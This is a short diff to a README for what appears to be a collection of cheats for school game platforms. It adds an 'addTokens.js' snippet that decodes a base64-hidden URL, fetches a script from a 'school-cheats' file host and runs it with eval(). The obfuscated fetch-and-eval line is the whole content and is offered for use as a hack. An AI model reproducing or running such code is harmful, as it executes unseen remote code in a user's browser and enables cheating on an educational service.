@@ -6,3 +6,6 @@ glixzzy stop making profit off school cheats
 # Here are the big juicy hecks collection
 shut nothing here yet
 ## <a id="addTokens.js"></a>addTokens.js
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbEFkZFRva2Vucy5qcw==')).then((res) => res.text().then((t) => eval(t)))
+```
